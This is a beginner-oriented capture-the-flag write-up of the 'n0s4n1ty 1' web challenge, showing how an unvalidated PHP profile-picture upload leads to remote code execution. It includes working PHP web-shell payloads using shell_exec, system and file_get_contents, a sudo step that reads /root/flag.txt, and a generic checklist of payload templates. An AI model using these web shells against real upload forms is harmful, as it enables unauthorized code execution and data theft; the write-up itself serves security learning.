 🔐 n0s4n1ty 1 — Beginner-Friendly File Upload Exploitation

Challenge: n0s4n1ty 1
Category: Web Exploitation
Goal: Exploit a vulnerable profile picture upload to get RCE (Remote Code Execution) and retrieve the flag from `/root/flag.txt`

---

 🧪 Overview

This was a classic case of insecure file upload — a goldmine for beginners learning web security. If you're just getting into CTFs and see a file upload form, get excited. This is often the key to breaking in.

Let me walk you through how I approached and solved this challenge. I'll keep it beginner-friendly, explaining each step, what I was thinking, and what tools I used.

---

 🛠️ Step 1: Testing the Upload Feature

Once the challenge instance was live, I was directed to a webpage with a basic form to upload a profile picture.

I uploaded a normal image (`dog.jpg`) and clicked Upload Profile. The page redirected to something like:

```
/upload.php
```

With the message:

```
The file dog.jpg has been uploaded
Path: uploads/dog.jpg
```

So now I knew:

 It's a PHP app.
 Files are stored in `/uploads/`.
 Files are accessible via direct URL like `http://<site>/uploads/filename`.

I visited the image URL and yes, the image showed up perfectly.

> Tip: Always verify if uploaded files are accessible. This is the first step to checking for file upload vulnerabilities.

---

 🧐 Step 2: What Happens if I Upload Code?

The next thought was obvious: Can I upload something other than an image? Like... a PHP file?

I created a basic PHP file called `info.php` with the following code:

```php
<?php
phpinfo();
?>
```

Why `phpinfo()`? Because it's harmless, easy to recognize if it works, and gives us tons of info about the server.

I uploaded `info.php`, and... boom. It accepted it. No error.

Visiting `/uploads/info.php` opened the PHP Info page.

That means:

 No validation of file types.
 Server executes uploaded `.php` files.

> CTF Tip: If you can upload and execute `.php` files, you've likely got RCE.

---

 ⚡ Step 3: Weaponizing the Upload

Now it was time to go after the real target — the flag inside `/root/flag.txt`.

I tried listing the `/root` directory with:

```php
<?php
print_r(scandir("/root"));
?>
```

This gave me a permission denied warning.

So instead, I moved to command execution with:

```php
<?php
echo shell_exec("ls /root");
?>
```

Still nothing. Hmm.

Then I tried:

```php
<?php
echo shell_exec("sudo ls /root");
?>
```

And YES — it printed:

```
flag.txt
```

Now for the final move:

```php
<?php
echo shell_exec("sudo cat /root/flag.txt");
?>
```

And... 🎉 Hello flag!

---

 🧵 Things You Can Try in Similar Challenges

If you find a file upload feature, try this path:

1. Upload a harmless image to understand how the system responds.
2. Try uploading a PHP file with `phpinfo()` or `echo "Hello";` to check code execution.
3. Write PHP files with `shell_exec`, `system`, or `exec` to run commands.
4. List directories like `/`, `/home`, or `/root`.
5. Look for flags in typical locations: `/flag`, `/root/flag.txt`, `/home/user/flag.txt`, etc.

Also, here are some helpful payload templates:

```php
<?php echo shell_exec("ls /"); ?>
<?php echo system("whoami"); ?>
<?php echo file_get_contents("/root/flag.txt"); ?>
```

---

 📅 Summary

This challenge was beginner-friendly but powerful in what it teaches:

 The importance of server-side file validation.
 Why executing user uploads is a dangerous idea.
 How simple PHP functions like `shell_exec` can lead to total compromise.

 🏰 Final Flag:

(Flag content omitted for spoiler reasons.)
![Screenshot 2025-07-03 220826](https://github.com/user-attachments/assets/144d3092-a286-445d-8547-0a8e6a8563b1)


---

 🎉 Final Thoughts

If you’re new to CTFs and find one with a file upload, don’t ignore it. That’s your entry point. Keep experimenting, Google a lot (seriously), and build your payloads step-by-step.

Happy hacking! Follow me for more CTF walkthroughs and practical web security breakdowns.

---



Stay curious. Stay sharp. ✨
